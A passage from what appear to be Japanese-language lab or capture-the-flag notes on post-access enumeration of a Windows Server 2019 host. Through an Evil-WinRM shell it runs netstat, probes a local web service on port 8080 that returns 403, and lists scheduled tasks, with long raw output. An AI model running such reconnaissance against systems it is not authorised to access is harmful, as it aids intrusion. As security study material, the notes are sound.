WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 10/9/2024 4:41:42 PM
WindowsProductId                                        : 00429-70000-00000-AA826
WindowsProductName                                      : Windows Server 2019 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1809
BiosCharacteristics                                     :
BiosBIOSVersion                                         :
BiosBuildNumber                                         :
BiosCaption                                             :
BiosCodeSet                                             :
BiosCurrentLanguage                                     :
BiosDescription                                         :
BiosEmbeddedControllerMajorVersion                      :
BiosEmbeddedControllerMinorVersion                      :
BiosFirmwareType                                        :
BiosIdentificationCode                                  :
BiosInstallableLanguages                                :
BiosInstallDate                                         :
BiosLanguageEdition                                     :
BiosListOfLanguages                                     :
BiosManufacturer                                        :
BiosName                                                :
BiosOtherTargetOS                                       :
BiosPrimaryBIOS                                         :
BiosReleaseDate                                         :
BiosSeralNumber                                         :
BiosSMBIOSBIOSVersion                                   :
BiosSMBIOSMajorVersion                                  :
BiosSMBIOSMinorVersion                                  :
BiosSMBIOSPresent                                       :
BiosSoftwareElementState                                :
BiosStatus                                              :
BiosSystemBiosMajorVersion                              :
BiosSystemBiosMinorVersion                              :
BiosTargetOperatingSystem                               :
BiosVersion                                             :
CsAdminPasswordStatus                                   :
CsAutomaticManagedPagefile                              :
CsAutomaticResetBootOption                              :
CsAutomaticResetCapability                              :
CsBootOptionOnLimit                                     :
CsBootOptionOnWatchDog                                  :
CsBootROMSupported                                      :
CsBootStatus                                            :
CsBootupState                                           :
CsCaption                                               :
CsChassisBootupState                                    :
CsChassisSKUNumber                                      :
CsCurrentTimeZone                                       :
CsDaylightInEffect                                      :
CsDescription                                           :
CsDNSHostName                                           :
CsDomain                                                :
CsDomainRole                                            :
CsEnableDaylightSavingsTime                             :
CsFrontPanelResetStatus                                 :
CsHypervisorPresent                                     :
CsInfraredSupported                                     :
CsInitialLoadInfo                                       :
CsInstallDate                                           :
CsKeyboardPasswordStatus                                :
CsLastLoadInfo                                          :
CsManufacturer                                          :
CsModel                                                 :
CsName                                                  :
CsNetworkAdapters                                       :
CsNetworkServerModeEnabled                              :
CsNumberOfLogicalProcessors                             :
CsNumberOfProcessors                                    :
CsProcessors                                            :
CsOEMStringArray                                        :
CsPartOfDomain                                          :
CsPauseAfterReset                                       :
CsPCSystemType                                          :
CsPCSystemTypeEx                                        :
CsPowerManagementCapabilities                           :
CsPowerManagementSupported                              :
CsPowerOnPasswordStatus                                 :
CsPowerState                                            :
CsPowerSupplyState                                      :
CsPrimaryOwnerContact                                   :
CsPrimaryOwnerName                                      :
CsResetCapability                                       :
CsResetCount                                            :
CsResetLimit                                            :
CsRoles                                                 :
CsStatus                                                :
CsSupportContactDescription                             :
CsSystemFamily                                          :
CsSystemSKUNumber                                       :
CsSystemType                                            :
CsThermalState                                          :
CsTotalPhysicalMemory                                   :
CsPhyicallyInstalledMemory                              :
CsUserName                                              :
CsWakeUpType                                            :
CsWorkgroup                                             :
OsName                                                  :
OsType                                                  :
OsOperatingSystemSKU                                    :
OsVersion                                               :
OsCSDVersion                                            :
OsBuildNumber                                           :
OsHotFixes                                              :
OsBootDevice                                            :
OsSystemDevice                                          :
OsSystemDirectory                                       :
OsSystemDrive                                           :
OsWindowsDirectory                                      :
OsCountryCode                                           :
OsCurrentTimeZone                                       :
OsLocaleID                                              :
OsLocale                                                :
OsLocalDateTime                                         :
OsLastBootUpTime                                        :
OsUptime                                                :
OsBuildType                                             :
OsCodeSet                                               :
OsDataExecutionPreventionAvailable                      :
OsDataExecutionPrevention32BitApplications              :
OsDataExecutionPreventionDrivers                        :
OsDataExecutionPreventionSupportPolicy                  :
OsDebug                                                 :
OsDistributed                                           :
OsEncryptionLevel                                       :
OsForegroundApplicationBoost                            :
OsTotalVisibleMemorySize                                :
OsFreePhysicalMemory                                    :
OsTotalVirtualMemorySize                                :
OsFreeVirtualMemory                                     :
OsInUseVirtualMemory                                    :
OsTotalSwapSpaceSize                                    :
OsSizeStoredInPagingFiles                               :
OsFreeSpaceInPagingFiles                                :
OsPagingFiles                                           :
OsHardwareAbstractionLayer                              :
OsInstallDate                                           :
OsManufacturer                                          :
OsMaxNumberOfProcesses                                  :
OsMaxProcessMemorySize                                  :
OsMuiLanguages                                          :
OsNumberOfLicensedUsers                                 :
OsNumberOfProcesses                                     :
OsNumberOfUsers                                         :
OsOrganization                                          :
OsArchitecture                                          :
OsLanguage                                              :
OsProductSuites                                         :
OsOtherTypeDescription                                  :
OsPAEEnabled                                            :
OsPortableOperatingSystem                               :
OsPrimary                                               :
OsProductType                                           :
OsRegisteredUser                                        :
OsSerialNumber                                          :
OsServicePackMajorVersion                               :
OsServicePackMinorVersion                               :
OsStatus                                                :
OsSuites                                                :
OsServerLevel                                           : FullServer
KeyboardLayout                                          :
TimeZone                                                : (UTC-08:00) Pacific Time (US & Canada)
LogonServer                                             :
PowerPlatformRole                                       : Desktop
HyperVisorPresent                                       :
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   :
DeviceGuardAvailableSecurityProperties                  :
DeviceGuardSecurityServicesConfigured                   :
DeviceGuardSecurityServicesRunning                      :
DeviceGuardCodeIntegrityPolicyEnforcementStatus         :
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :

```

---

### ネットワーク

- 抜粋
	- TCP8080がopen
```powershell
*Evil-WinRM* PS C:\Users> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3944

```

#### webサービス確認

- ブラウザ、シェル、ローカルからのいずれからも403
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> wget 127.0.0.1:8080
The remote server returned an error: (403) Forbidden.
At line:1 char:1
+ wget 127.0.0.1:8080
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

#### all service

```
schtasks /query /fo LIST /v
```
```powershell
*Evil-WinRM* PS C:\Scripts> schtasks /query /fo LIST /v

Folder: \
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Server Initial Configuration Task
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 12:39:12 PM
Last Result:                          0
Author:                               $(@%systemroot%\system32\SrvInitConfig.exe,-100)
Task To Run:                          %windir%\system32\srvinitconfig.exe /disableconfigtask
Start In:                             N/A
Comment:                              $(@%systemroot%\system32\SrvInitConfig.exe,-101)
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\.NET Framework
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:24:18 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:24:18 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 9:50:08 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At idle time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/9/2024 9:50:08 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At idle time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if authentication to the template distribution web service on the server fails. In this case, it fails silently.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Everyone
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Daily
Start Time:                           3:00:00 AM
Start Date:                           11/9/2006
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Automated)
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if authentication to the template distribution web service on the server fails. In this case, it fails silently.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          Everyone
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Management (Manual)
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              Updates the AD RMS rights policy templates for the user. This job provides a credential prompt if authentication to the template distribution web service on the server fails.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Everyone
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 01:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\AppID
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\AppID\PolicyConverter
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\appidpolicyconverter.exe
Start In:                             N/A
Comment:                              Converts the software restriction policies policy from XML into binary format.
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\AppID\VerifiedPublisherCertStoreCheck
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\appidcertstorecheck.exe
Start In:                             N/A
Comment:                              Inspects the AppID certificate cache for invalid or revoked certificates.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for 3 minutes, If Not Idle Retry For 1380 minutes Stop the task if Idle State end
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          LOCAL SERVICE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Application Experience
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time:                        1/11/2026 3:15:25 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 3:46:33 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\compattelrunner.exe
Start In:                             N/A
Comment:                              Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           3:00:00 AM
Start Date:                           9/1/2008
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time:                        1/11/2026 4:36:29 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 3:46:33 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\compattelrunner.exe
Start In:                             N/A
Comment:                              Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Next Run Time:                        1/11/2026 4:40:29 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 3:46:33 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\compattelrunner.exe
Start In:                             N/A
Comment:                              Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 96:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Application Experience\ProgramDataUpdater
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               $(@%SystemRoot%\system32\invagent.dll,-701)
Task To Run:                          %windir%\system32\compattelrunner.exe -maintenance
Start In:                             N/A
Comment:                              $(@%SystemRoot%\system32\invagent.dll,-702)
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Application Experience\StartupAppTask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask
Start In:                             N/A
Comment:                              Scans startup entries and raises notification to the user if there are too many startup entries.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\ApplicationData
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ApplicationData\appuriverifierdaily
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe
Start In:                             N/A
Comment:                              Verifies AppUriHandler host registrations.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:15:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ApplicationData\appuriverifierinstall
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\AppHostRegistrationVerifier.exe
Start In:                             N/A
Comment:                              Verifies AppUriHandler host registrations.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 00:15:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ApplicationData\CleanupTemporaryState
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
Start In:                             N/A
Comment:                              Cleans up each package's unused temporary files.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\ApplicationData\DsSvcCleanup
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:01 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\dstokenclean.exe
Start In:                             N/A
Comment:                              Performs maintenance for the Data Sharing Service.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\AppxDeploymentClient
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/13/2024 2:34:04 AM
Last Result:                          0
Author:                               N/A
Task To Run:                          %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for 15 minutes, If Not Idle Retry For 15 minutes
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At logon time
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Autochk
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Autochk\Proxy
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        1/10/2026 12:10:00 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
Start In:                             N/A
Comment:                              This task collects and uploads autochk SQM data if opted-in to the Microsoft Customer Experience Improvement Program.
Scheduled Task State:                 Enabled
Idle Time:                            Only Start If Idle for 10 minutes, If Not Idle Retry For 525600 minutes
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\BitLocker
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

HostName:                             SRV22
TaskName:                             \Microsoft\Windows\BitLocker\BitLocker MDM policy Refresh
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        Undefined
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\Bluetooth
HostName:                             SRV22
TaskName:                             \Microsoft\Windows\Bluetooth\UninstallDeviceTask
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               Microsoft
Task To Run:                          BthUdTask.exe $(Arg0)
Start In:                             N/A
Comment:                              Uninstalls the PnP device associated with the specified Bluetooth service ID
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

Folder: \Microsoft\Windows\BrokerInfrastructure
